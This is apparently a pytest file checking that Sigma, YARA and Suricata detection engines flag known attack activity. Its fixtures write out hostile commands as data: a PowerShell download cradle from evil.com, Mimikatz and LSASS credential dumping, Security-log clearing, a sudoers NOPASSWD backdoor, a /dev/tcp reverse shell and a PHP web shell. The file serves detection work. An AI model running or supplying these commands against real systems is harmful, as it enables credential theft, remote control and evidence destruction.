"""Unit tests for Sigma, YARA, and Suricata Detection Rule Engines."""

import pytest
from pathlib import Path
from cybershield.core.models import NormalizedEvent, LogSourceType
from cybershield.engines.sigma_engine import sigma_engine
from cybershield.engines.yara_engine import yara_engine


def test_sigma_powershell_download_cradle_detection():
    """Verify Sigma engine detects PowerShell cradle execution."""
    evt = NormalizedEvent(
        log_source=LogSourceType.SYSMON,
        process_name="powershell.exe",
        command_line="powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX",
        host_name="ws-eng-02.corp",
        user_name="alice",
    )
    alerts = sigma_engine.evaluate_event(evt)
    assert len(alerts) > 0
    matched_rules = [a.rule_name for a in alerts]
    assert any("PowerShell" in name for name in matched_rules)


def test_sigma_mimikatz_detection():
    """Verify Sigma engine catches Mimikatz password dumping command line."""
    evt = NormalizedEvent(
        log_source=LogSourceType.SYSMON,
        process_name="mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        host_name="dc-primary.corp",
        user_name="admin_corp",
    )
    alerts = sigma_engine.evaluate_event(evt)
    assert len(alerts) > 0
    assert any("Mimikatz" in a.rule_name for a in alerts)


def test_sigma_lsass_dumping_detection():
    """Verify Sigma engine catches comsvcs MiniDump LSASS dumping."""
    evt = NormalizedEvent(
        log_source=LogSourceType.SYSMON,
        process_name="rundll32.exe",
        command_line="rundll32.exe C:\\windows\\System32\\comsvcs.dll #24 624 lsass.dmp full",
        host_name="dc-primary.corp",
        user_name="admin_corp",
    )
    alerts = sigma_engine.evaluate_event(evt)
    assert len(alerts) > 0
    assert any("LSASS" in a.rule_name for a in alerts)


def test_sigma_log_clearing_detection():
    """Verify Sigma engine catches wevtutil clearing Security log."""
    evt = NormalizedEvent(
        log_source=LogSourceType.SYSMON,
        process_name="wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        host_name="ws-finance-01.corp",
        user_name="intruder",
    )
    alerts = sigma_engine.evaluate_event(evt)
    assert len(alerts) > 0
    assert any("Event Log Tampering" in a.rule_name for a in alerts)


def test_sigma_linux_sudoers_tampering_detection():
    """Verify Sigma engine catches sudoers NOPASSWD abuse."""
    evt = NormalizedEvent(
        log_source=LogSourceType.AUDITD,
        process_name="bash",
        command_line="echo 'evil ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
        host_name="srv-app-prod.corp",
        user_name="root",
    )
    alerts = sigma_engine.evaluate_event(evt)
    assert len(alerts) > 0
    assert any("Sudoers" in a.rule_name for a in alerts)


def test_sigma_linux_reverse_shell_detection():
    """Verify Sigma engine catches interactive TCP reverse shell."""
    evt = NormalizedEvent(
        log_source=LogSourceType.AUDITD,
        process_name="bash",
        command_line="bash -i >& /dev/tcp/198.51.100.12/4444 0>&1",
        host_name="srv-db-01.corp",
        user_name="www-data",
    )
    alerts = sigma_engine.evaluate_event(evt)
    assert len(alerts) > 0
    assert any("Reverse Shell" in a.rule_name for a in alerts)


def test_yara_webshell_pattern_detection():
    """Verify YARA engine matches PHP web shell backdoor strings."""
    webshell_content = "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>"
    matches = yara_engine.scan_data(webshell_content)
    assert len(matches) > 0
    rule_names = [rule.name for rule, _ in matches]
    assert "WebShell_Generic_PHP_JSP" in rule_names


def test_yara_ransomware_lockbit_detection():
    """Verify YARA engine catches LockBit 3.0 ransomware note and artifacts."""
    payload = "LockBit 3.0 the world's fastest and most stable ransomware! restore-my-files.txt"
    matches = yara_engine.scan_data(payload)
    assert len(matches) > 0
    rule_names = [rule.name for rule, _ in matches]
    assert "Ransomware_LockBit_3" in rule_names


def test_yara_wannacry_killswitch_detection():
    """Verify YARA engine catches WannaCry killswitch string."""
    payload = "GET / HTTP/1.1\r\nHost: www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\r\n\r\n"
    matches = yara_engine.scan_data(payload)
    assert len(matches) > 0
    rule_names = [rule.name for rule, _ in matches]
    assert "Ransomware_WannaCry_WanaCrypt0r" in rule_names


def test_yara_cobaltstrike_beacon_detection():
    """Verify YARA engine catches Cobalt Strike named pipe."""
    payload = "Connecting to \\\\.\\pipe\\msagent_77..."
    matches = yara_engine.scan_data(payload)
    assert len(matches) > 0
    rule_names = [rule.name for rule, _ in matches]
    assert "APT_CobaltStrike_Beacon" in rule_names


def test_yara_mimikatz_detection():
    """Verify YARA engine catches Mimikatz binary keywords."""
    payload = "sekurlsa::logonpasswords lsadump::sam"
    matches = yara_engine.scan_data(payload)
    assert len(matches) > 0
    rule_names = [rule.name for rule, _ in matches]
    assert "Tool_Mimikatz_Credential_Dumper" in rule_names


def test_suricata_rules_syntax_and_patterns():
    """Verify Suricata / Snort NIDS signatures exist and have valid syntax."""
    rules_file = Path("rules/suricata/threats.rules")
    assert rules_file.exists()
    content = rules_file.read_text(encoding="utf-8")
    lines = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith("#")]
    assert len(lines) >= 8
    # Validate each line has alert, protocol, sid, rev
    for line in lines:
        assert line.startswith("alert ")
        assert "sid:" in line
        assert "rev:" in line
        assert "msg:" in line
